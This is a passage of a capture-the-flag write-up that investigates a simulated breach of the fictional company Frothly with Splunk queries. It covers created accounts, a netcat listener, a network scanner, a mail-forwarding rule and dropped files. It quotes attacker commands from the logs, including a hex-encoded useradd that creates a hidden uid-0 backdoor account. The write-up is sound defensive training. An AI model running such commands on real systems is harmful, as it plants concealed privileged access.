+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">tomcat7 sourcetype<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;osquery:results&#34;</span>
+</code></pre></div><p>The first is above; the second is:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json"><span style="color:#960050;background-color:#1e0010">action:</span> <span style="color:#960050;background-color:#1e0010">added</span>
+<span style="color:#960050;background-color:#1e0010">calendarTime:</span> <span style="color:#960050;background-color:#1e0010">Mon</span> <span style="color:#960050;background-color:#1e0010">Aug</span> <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">11</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">08</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">05</span> <span style="color:#ae81ff">2018</span> <span style="color:#960050;background-color:#1e0010">UTC</span>
+<span style="color:#960050;background-color:#1e0010">cmdline:</span> <span style="color:#e6db74">&#34;useradd&#34;</span> <span style="color:#e6db74">&#34;-ou&#34;</span> <span style="color:#e6db74">&#34;tomcat7&#34;</span> <span style="color:#e6db74">&#34;-p&#34;</span> <span style="color:#e6db74">&#34;davidverve.com&#34;</span> <span style="color:#e6db74">&#34;0&#34;</span> <span style="color:#e6db74">&#34;-g&#34;</span> <span style="color:#e6db74">&#34;0&#34;</span> <span style="color:#e6db74">&#34;-M&#34;</span> <span style="color:#e6db74">&#34;-N&#34;</span> <span style="color:#e6db74">&#34;-r&#34;</span> <span style="color:#e6db74">&#34;-s&#34;</span> <span style="color:#e6db74">&#34;/bin/bash&#34;</span>
+<span style="color:#960050;background-color:#1e0010">decorations:username:</span> <span style="color:#960050;background-color:#1e0010">tomcat</span><span style="color:#ae81ff">8</span>
+</code></pre></div><p>We&rsquo;ll see more of <em>tomcat8</em> in a later question, although while we&rsquo;re here:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sourcetype<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;osquery:results&#34;</span> <span style="color:#e6db74">&#34;decorations.username&#34;</span><span style="color:#f92672">=</span>tomcat8
+| table _time columns.cmdline
+| reverse
+</code></pre></div><p>There are four commands, each in the following pair form:</p>
+<p>1st event: <code>&quot;/bin/bash&quot; &quot;-c&quot; 75736572616464202D6F752030202D672030202D4D202D4E202D72202D73202F62696E2F626173682020746F6D63617437202D7020646176696476657276652E636F6D</code></p>
+<p>2nd event: <code>&quot;useradd&quot; &quot;-ou&quot; &quot;tomcat7&quot; &quot;-p&quot; &quot;davidverve.com&quot; &quot;0&quot; &quot;-g&quot; &quot;0&quot; &quot;-M&quot; &quot;-N&quot; &quot;-r&quot; &quot;-s&quot; &quot;/bin/bash&quot;</code></p>
+<p>The second event is the first string decoded from hex. The other decoded/raw commands are:</p>
+<ul>
+<li>
+<p><code>&quot;uname&quot; &quot;-a&quot;</code></p>
+</li>
+<li>
+<p><code>&quot;/usr/bin/python3&quot; &quot;-Es&quot; &quot;/usr/bin/lsb_release&quot; &quot;-a&quot;</code></p>
+</li>
+<li>
+<p><code>&quot;dpkg-query&quot; &quot;-f&quot; &quot;lsb-printing&quot; &quot;lsb-security&quot; 247B56657273696F6E7D20247B50726F76696465737D0A &quot;-W&quot; &quot;lsb-core&quot; &quot;lsb-cxx&quot; &quot;lsb-graphics&quot; &quot;lsb-desktop&quot; &quot;lsb-languages&quot; &quot;lsb-multimedia&quot;</code></p>
+<p><code>247B56657273696F6E7D20247B50726F76696465737D0A</code> → <code>${Version} ${Provides}</code></p>
+</li>
+</ul>
+<p><br/><br/></p>
+<h3 id="304----what-is-the-name-of-the-user-that-was-created-after-the-endpoint-was-compromised">304 -|- What is the name of the user that was created after the endpoint was compromised?</h3>
+<p>It seems the endpoints are Windows (Q215, and others). New users are recorded as event 4720.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">EventCode<span style="color:#f92672">=</span><span style="color:#ae81ff">4720</span>
+</code></pre></div><p>1 event.</p>
+<blockquote>
+<p>svcvnc</p>
+</blockquote>
+<p>Time = 10:08:17</p>
+<p>Host = FYODOR-L</p>
+<p><br/><br/></p>
+<h3 id="305----what-is-the-process-id-of-the-process-listening-on-a-leet-port">305 -|- What is the process ID of the process listening on a &ldquo;leet&rdquo; port?</h3>
+<p>Leet is 1337:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#ae81ff">1337</span>
+</code></pre></div><p>17,331 events. Check available fields for &ldquo;port&rdquo; to see if there are any. There are a few with 1337 values, including <code>Port</code> (1 event), <code>columns.port</code> (1 event), and <code>dest_port</code> (7 events). They all provide the answer, although they individually provide different information.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Port<span style="color:#f92672">=</span><span style="color:#ae81ff">1337</span> OR dest_port<span style="color:#f92672">=</span><span style="color:#ae81ff">1337</span> OR columns.port<span style="color:#f92672">=</span><span style="color:#ae81ff">1337</span>
+| reverse
+</code></pre></div><blockquote>
+<p>14356</p>
+</blockquote>
+<p>Times = 11:31:54 ~ 11:55:34</p>
+<p>Process = netcat</p>
+<p>Username = klagerfield</p>
+<p><br/><br/></p>
+<h3 id="306----a-search-query-originating-from-an-external-ip-address-of-frothlys-mail-server-yields-some-interesting-search-terms-what-is-the-search-string">306 -|- A search query originating from an external IP address of Frothly&rsquo;s mail server yields some interesting search terms. What is the search string?</h3>
+<p>We know Frothly use Microsoft Office 365, and there&rsquo;s an Exchange <code>Workload</code>. We&rsquo;re looking for a search query:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sourcetype<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;ms:o365:management&#34;</span> Workload<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Exchange&#34;</span> *query*
+</code></pre></div><p>1 event.</p>
+<blockquote>
+<p>cromdale OR beer OR financial OR secret</p>
+</blockquote>
+<p>Source = 104.207.83.63:21974</p>
+<p>Time = 10:48:28</p>
+<p><br/><br/></p>
+<h3 id="307----what-is-the-md5-value-of-the-file-downloaded-to-fyodors-endpoint-system-and-used-to-scan-frothlys-network">307 -|- What is the MD5 value of the file downloaded to Fyodor&rsquo;s endpoint system and used to scan Frothly&rsquo;s network?</h3>
+<p>We know the host, and Sysmon includes MD5s, so that&rsquo;s a good place to start:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">host<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;FYODOR-L&#34;</span> source<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;WinEventLog:Microsoft-Windows-Sysmon/Operational&#34;</span>
+</code></pre></div><p>4126 events. If the file was used, it means a process was created. This is <code>EventCode</code> 1:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">host<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;FYODOR-L&#34;</span> source<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;WinEventLog:Microsoft-Windows-Sysmon/Operational&#34;</span> EventCode<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
+</code></pre></div><p>158 events. There are 38 <code>Image</code>s. Let&rsquo;s see if any look suspicious:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">host<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;FYODOR-L&#34;</span> source<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;WinEventLog:Microsoft-Windows-Sysmon/Operational&#34;</span> EventCode<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
+| stats count by Image
+</code></pre></div><p>Two interesting files are in a Temp folder, <code>C:\Windows\Temp\unziped\lsof-master\iexeplorer.exe</code> and <code>C:\Windows\Temp\hdoor.exe</code>. Which does the scan?</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">host<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;FYODOR-L&#34;</span> source<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;WinEventLog:Microsoft-Windows-Sysmon/Operational&#34;</span> EventCode<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
+  Image<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;C:\\Windows\\Temp\\*&#34;</span>
+| reverse
+</code></pre></div><p>35 events. <em>hdoor.exe</em> is run first, once, then <em>iexeplorer.exe</em> is the other 34 events. The <code>CommandLine</code> for <em>hdoor.exe</em> is:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">&gt; <span style="color:#e6db74">&#34;C:\windows\temp\hdoor.exe&#34;</span> -hbs 192.168.9.1-192.168.9.50 /b /m /n
+</code></pre></div><p>That looks like a scan to me. And the event has the MD5.</p>
+<blockquote>
+<p>586EF56F4D8963DD546163AC31C865D7</p>
+</blockquote>
+<p>Time (hdoor.exe scan) = 10:43:10</p>
+<p><br/><br/></p>
+<h3 id="308----based-on-the-information-gathered-for-question-304-what-groups-was-this-user-assigned-to-after-the-endpoint-was-compromised">308 -|- Based on the information gathered for question 304, what groups was this user assigned to after the endpoint was compromised?</h3>
+<p>Q304 gave us the username <code>svcvnc</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">svcvnc
+</code></pre></div><p>15 events. The <code>EventCode</code> for adding a user to a group is 4732:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">svcvnc EventCode<span style="color:#f92672">=</span><span style="color:#ae81ff">4732</span>
+</code></pre></div><p>2 events, one for each group.</p>
+<blockquote>
+<p>Administrators,Users</p>
+</blockquote>
+<p>Time = 10:08:17 &amp; 10:08:35</p>
+<p><br/><br/></p>
+<h3 id="309----at-some-point-during-the-attack-a-users-domain-account-is-disabled-what-is-the-email-address-of-the-user-whose-account-gets-disabled-and-what-is-the-email-address-of-the-user-who-disabled-their-account">309 -|- At some point during the attack, a user&rsquo;s domain account is disabled. What is the email address of the user whose account gets disabled and what is the email address of the user who disabled their account?</h3>
+<p>Account disabled is <code>EventCode</code> 4725, but that gives nothing. However, from Q301 we found an <code>AccountEnabled</code> value within <code>ms:aad:audit</code> (which, in that question, was changed from <code>false</code> to <code>true</code>):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sourcetype<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;ms:aad:audit&#34;</span> AccountEnabled
+</code></pre></div><p>3 events. Add a table to find out see which is the one we&rsquo;re interested in, and the answers. For clarity, replace <code>AccountEnabled</code> with the full field, and add the old and new values..</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sourcetype<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;ms:aad:audit&#34;</span>
+  <span style="color:#e6db74">&#34;targets{}.modifiedProperties{}.name&#34;</span><span style="color:#f92672">=</span>AccountEnabled
+  <span style="color:#e6db74">&#34;targets{}.modifiedProperties{}.newValue&#34;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;[false]&#34;</span>
+  <span style="color:#e6db74">&#34;targets{}.modifiedProperties{}.oldValue&#34;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;[true]&#34;</span>
+| table targets<span style="color:#f92672">{}</span>.userPrincipalName actor.userPrincipalName
+  targets<span style="color:#f92672">{}</span>.modifiedProperties<span style="color:#f92672">{}</span>.name
+  targets<span style="color:#f92672">{}</span>.modifiedProperties<span style="color:#f92672">{}</span>.newValue
+  targets<span style="color:#f92672">{}</span>.modifiedProperties<span style="color:#f92672">{}</span>.oldValue
+</code></pre></div><blockquote>
+<p><a href="mailto:bgist@froth.ly">bgist@froth.ly</a>,fyodor@froth.ly</p>
+</blockquote>
+<p>Time = 14:47:12</p>
+<p><br/><br/></p>
+<h3 id="310----another-set-of-phishing-emails-were-sent-to-frothly-employees-after-the-adversary-gained-a-foothold-on-a-frothly-computer-this-malicious-content-was-detected-and-left-behind-a-digital-artifact-what-is-the-name-of-this-file">310 -|- Another set of phishing emails were sent to Frothly employees after the adversary gained a foothold on a Frothly computer. This malicious content was detected and left behind a digital artifact. What is the name of this file?</h3>
+<p>It&rsquo;s an email so start with <code>stream:smtp</code>, and we know there is an attachment so include <code>file_name</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sourcetype<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stream:smtp&#34;</span> file_name<span style="color:#f92672">=</span>*
+</code></pre></div><p>11 events. There are 7 unique <code>file_name</code>s. Most are images with generic names, but <code>pwned.jpg</code> and <code>Malware Alert Text.txt</code> look interesting. We saw the text file earlier in Q304&hellip; But first let&rsquo;s look at <code>pwned.jpg</code>. Looking at the email <code>content_body</code> (message), it doesn&rsquo;t seem like anything abnormal. Let&rsquo;s decode the <code>pwned.jpg</code> using <a href="https://base64.guru/converter/decode/image" target="_blank">https://base64.guru/converter/decode/image</a> anyway.</p>
+<p><img src="../img/botsv3_img3.png" alt="botsv3_img3"></p>
+<p>Nice.</p>
+<p>So, the text file. We found in Q304 it relates to <code>Frothly-Brewery-Financial-Planning-FY2019-Draft.xlsm</code>. Oh, that&rsquo;s the answer.</p>
+<blockquote>
+<p>Frothly-Brewery-Financial-Planning-FY2019-Draft.xlsm</p>
+</blockquote>
+<p>Time = 09:55:14</p>
+<p><br/><br/></p>
+<h3 id="311----based-on-the-answer-to-question-310-what-is-the-name-of-the-executable-that-was-embedded-in-the-malware">311 -|- Based on the answer to question 310, what is the name of the executable that was embedded in the malware?</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">*Frothly-Brewery-Financial-Planning-FY2019-Draft.xlsm*
+</code></pre></div><p>Nothing. Go broader - try only the file extension:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">*.xlsm*
+</code></pre></div><p>5 events. Three are for a different .xls file; the other two have <code>Frothly-Brewery-Financial-Planning-FY2019-Draft[66].xlsm</code>. Replace our search with that to see the 2 events.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#e6db74">&#34;Frothly-Brewery-Financial-Planning-FY2019-Draft[66].xlsm&#34;</span>
+</code></pre></div><p>The first is a <code>WinEventLog:Application</code> event for <code>SourceName=Symantec AntiVirus</code>:</p>
+<pre tabindex="0"><code>Security Risk Found! W97M.Empstage in File: C:\Users\BruceGist\AppData\Local\Packages\
+microsoft.windowscommunicationsapps_8wekyb3d8bbwe\LocalState\Files\S0\3\
+Frothly-Brewery-Financial-Planning-FY2019-Draft[66].xlsm by: Auto-Protect scan.  
+Action: Cleaned by Deletion.  Action Description: The file was deleted successfully.
+</code></pre><p>Time = 09:56:39</p>
+<p>The other is a Sysmon event. with an <code>Image</code> of <code>C:\Program Files\WindowsApps\microsoft.windowscommunicationsapps_16005.10228.20127.0_x64__8wekyb3d8bbwe\HxTsr.exe</code></p>
+<p>Time = 09:55:52</p>
+<blockquote>
+<p>HxTsr.exe</p>
+</blockquote>
+<p><strong>Bonus</strong></p>
+<p>According to <a href="https://www.pcrisk.com/removal-guides/15096-hxtsr-exe-virus" target="_blank">https://www.pcrisk.com/removal-guides/15096-hxtsr-exe-virus</a>:</p>
+<p>&ldquo;HxTsr.exe (Hidden Executable To Sync Remote Servers) is a legitimate file that can be found in Microsoft Windows Operating Systems. This file/process is part of Microsoft Outlook, a MS Office product, however, its name might be used by cyber criminals to disguise their malicious programs. Therefore, a file with this name could be detected as a threat by virus detection engines.&rdquo;</p>
+<p>However, doing more research from the dataset, I can&rsquo;t see anything particularly malicious. For example, looking at Cisco NVM Flow Data:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">source<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;cisconvmflowdata&#34;</span> pn<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;HxTsr.exe&#34;</span>
+| table _time liuidp ppn da dh
+| iplocation da
+| reverse
+</code></pre></div><p>All 237 events are started by <em>svchost.exe</em>, and every IP/connection looks to be to a valid Microsoft domain (Outlook, Skype, Office, etc).</p>
+<p><br/><br/></p>
+<h3 id="312----how-many-unique-ip-addresses-used-the-malicious-link-file-that-was-sent">312 -|- How many unique IP addresses &ldquo;used&rdquo; the malicious link file that was sent?</h3>
+<p>From Q300, the malicious link file was <code>BRUCE BIRTHDAY HAPPY HOUR PICS.lnk</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#e6db74">&#34;BRUCE BIRTHDAY HAPPY HOUR PICS.lnk&#34;</span>
+</code></pre></div><p>67 events. There are three families of sourcetypes - <code>ms:o365:XXX</code> (48), <code>[xml]winevenlog</code> (16), <code>symantec:XXX</code> (3). From before, we found the <code>Operation</code> field, part of <code>ms:o365:management,</code> can be useful. One value looks promising:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#e6db74">&#34;BRUCE BIRTHDAY HAPPY HOUR PICS.lnk&#34;</span> Operation<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;AnonymousLinkUsed&#34;</span>
+</code></pre></div><p>22 events. Check the IP fields, and there is <code>ClientIP</code> and <code>src_ip</code>, each with 7 unique values.</p>
+<blockquote>
+<p>7</p>
+</blockquote>
+<p>Time = 09:59:04 ~ 11:28:30</p>
+<p><br/><br/></p>
+<h3 id="314----what-port-number-did-the-adversary-use-to-download-their-attack-tools">314 -|- What port number did the adversary use to download their attack tools?</h3>
+<p>It&rsquo;s likely a rare port was used, so first check those. UDP isn&rsquo;t really used for transferring files, so limit it to TCP:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sourcetype<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stream:tcp&#34;</span>
+| rare dest_port
+</code></pre></div><p>There are a few; port 3333 and 50504 only have 1 connection each. Let&rsquo;s see what they are for:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">dest_port<span style="color:#f92672">=</span><span style="color:#ae81ff">3333</span>
+</code></pre></div><p>2 events. The first is <code>stream:tcp</code>, the second is <code>stream:http</code>. The latter is GETing <em>/images/logos.png</em> - and the <code>http_user_agent</code> is PowerShell. Suspicious.</p>
+<p>A quick check shows 50504 is an internal connection, so we&rsquo;ll ignore that.</p>
+<blockquote>
+<p>3333</p>
+</blockquote>
+<p>Time = 10:47:16</p>
+<p>IP = 45.77.53.176</p>
+<p>Host = FYODOR-L</p>
+<p><br/><br/></p>
+<h3 id="315----during-the-attack-two-files-are-remotely-streamed-to-the-tmp-directory-of-the-on-premises-linux-server-by-the-adversary-what-are-the-names-of-these-files">315 -|- During the attack, two files are remotely streamed to the /tmp directory of the on-premises Linux server by the adversary. What are the names of these files?</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">*/tmp/*
+</code></pre></div><p>2991 events. However, most are sourcetypes <code>lsof</code> and <code>ps</code>. <code>wineventlog</code> has only 18 events, so let&rsquo;s see what they are.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">*/tmp/* sourcetype<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;wineventlog&#34;</span>
+</code></pre></div><p>It seems that PowerShell is being used 9 times to execute the malicious <em>iexeplorer.exe</em> file (Q307), and the command lines look suspicious.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">*/tmp/* sourcetype<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;wineventlog&#34;</span>
+| dedup Process_Command_Line
+| table _time Process_Command_Line
+| reverse
+</code></pre></div><p>First a string is echo&rsquo;d to <em>/tmp/colonel</em>, then another to <em>/tmp/definitelydontinvestigatethisfile.sh</em></p>
+<blockquote>
+<p>colonel,definitelydontinvestigatethisfile.sh</p>
+</blockquote>
+<p>Time = 11:08:36 &amp; 11:08:48</p>
+<p>Note files also referenced on <code>oquery:results</code>.</p>
+<p><br/><br/></p>
+<h3 id="316----based-on-the-information-gathered-for-question-314-what-file-can-be-inferred-to-contain-the-attack-tools">316 -|- Based on the information gathered for question 314, what file can be inferred to contain the attack tools?</h3>
+<p>Q314</p>
+<blockquote>
+<p>logos.png</p>
+</blockquote>
+<p><br/><br/></p>
+<h3 id="317----what-is-the-first-executable-uploaded-to-the-domain-admin-accounts-compromised-endpoint-system">317 -|- What is the first executable uploaded to the domain admin account&rsquo;s compromised endpoint system?</h3>
+<p>I don&rsquo;t know who the domain admin is, but most executables are .exes:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json"><span style="color:#960050;background-color:#1e0010">*.exe</span>
+</code></pre></div><blockquote>
+<p>232k events. Most are <code>cisconvmflowdata</code>, so let&rsquo;s filter those down to processes:</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">*.exe source<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;cisconvmflowdata&#34;</span>
+| dedup pn
+| table _time sa da ds ppa pap liuidp ppn pn
+| reverse
+</code></pre></div><p>60 events. Abnormal processes, in chronological order, include <em>hdoor.exe</em>, <em>iexeplorer.exe</em> and <em>HxTsr.exe</em>. <em>hdoor.exe</em> is from 192.168.8.103, which is the host <em>hoth</em>, time = 10:44:07.</p>
+<p>Another large source is Sysmon. Again, filter to processes:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">*.exe source<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;WinEventLog:Microsoft-Windows-Sysmon/Operational&#34;</span>
+| dedup Image
+| table _time Image Computer User SourceIp DestinationIp
+| reverse
+</code></pre></div><p>162 events. However, most don&rsquo;t have connections. Filter to only those with connections:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">*.exe source<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;WinEventLog:Microsoft-Windows-Sysmon/Operational&#34;</span> SourceIp<span style="color:#f92672">=</span>*
+| dedup Image
+| table _time Image Computer User SourceIp DestinationIp
+| reverse
+</code></pre></div><p>12 events. Most are normal (Chrome, ssh, putty, Dropbox), although again, chronologically, we have <em>hdoor.exe</em> and <em>iexeplorer.exe</em>. <em>hdoor.exe</em> is from the same IP/host, time = 10:44:05.</p>
+<p>Doing a bit more research on <em>hdoor.exe</em>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json"><span style="color:#960050;background-color:#1e0010">hdoor.exe</span>
+<span style="color:#960050;background-color:#1e0010">|</span> <span style="color:#960050;background-color:#1e0010">reverse</span>
+</code></pre></div><p>It looks like, at 10:43:10, Powershell was used to download the file and then run it (see Q307).</p>
+<blockquote>
+<p>hdoor.exe</p>
+</blockquote>
+<p>Domain Admin = FYODOR-L</p>
+<p><br/><br/></p>
+<h3 id="318----from-what-country-is-a-small-brute-force-or-password-spray-attack-occurring-against-the-frothly-web-servers">318 -|- From what country is a small brute force or password spray attack occurring against the Frothly web servers?</h3>
+<p>The web servers are called <em>gacruz.i-XXX</em>, and are Linux. There&rsquo;s a <code>linux_secure</code> sourcetype:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">host<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;gacrux.i-*&#34;</span> sourcetype<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;linux_secure&#34;</span>
+</code></pre></div><p>128 events. We don&rsquo;t want the attacks coming <em>from</em> the local machines, so remove them:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">host<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;gacrux.i-*&#34;</span> sourcetype<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;linux_secure&#34;</span> NOT src<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;*.i-*&#34;</span>
+</code></pre></div><p>8 events. Ignoring two outliers, there are 3 groups of &ldquo;invalid user&rdquo; with generic usernames followed by &ldquo;connection closed&rdquo; from the same IP within 1 minute.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">host<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;gacrux.i-*&#34;</span> sourcetype<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;linux_secure&#34;</span> NOT src<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;*.i-*&#34;</span>
+| top src
+| iplocation src
+</code></pre></div><blockquote>
+<p>Russia</p>
+</blockquote>
+<p>IP = 5.101.40.81</p>
+<p>Time = 15:07:22 ~ 15:08:12</p>
+<p><br/><br/></p>
+<h3 id="319----the-adversary-created-a-bcc-rule-to-forward-frothlys-email-to-his-personal-account-what-is-the-value-of-the-name-parameter-set-to">319 -|- The adversary created a BCC rule to forward Frothly&rsquo;s email to his personal account. What is the value of the &ldquo;Name&rdquo; parameter set to?</h3>
+<p>From Q306 we know they use Microsoft Office 365 Exchange for emails. We&rsquo;re looking for BCC a.k.a. Blind Carbon Copy</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sourcetype<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;ms:o365:management&#34;</span> Workload<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Exchange&#34;</span> <span style="color:#f92672">(</span>*bcc* OR *blind* OR *copy*<span style="color:#f92672">)</span>
+</code></pre></div><p>1 event. Blind exists in <code>&quot;Parameters{}.Name&quot;=BlindCopyTo</code></p>
+<blockquote>
+<p>SOX</p>
+</blockquote>
+<p>Time = 11:21:40</p>
+<p>BCC to = [yunki1984@naver.com → Naver is Korean, and 현기 could be a Korean name.</p>
+<p><br/><br/></p>
+<h3 id="320----what-is-the-password-for-the-user-that-was-created-on-the-compromised-endpoint">320 -|- What is the password for the user that was created on the compromised endpoint?</h3>
+<p>From Q304, the new user is <em>svcvnc</em>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">svcvnc
+</code></pre></div><p>15 events. Check the <code>CommandLine</code> arguments.</p>
+<blockquote>
+<p>Password123!</p>
+</blockquote>
+<p><br/><br/></p>
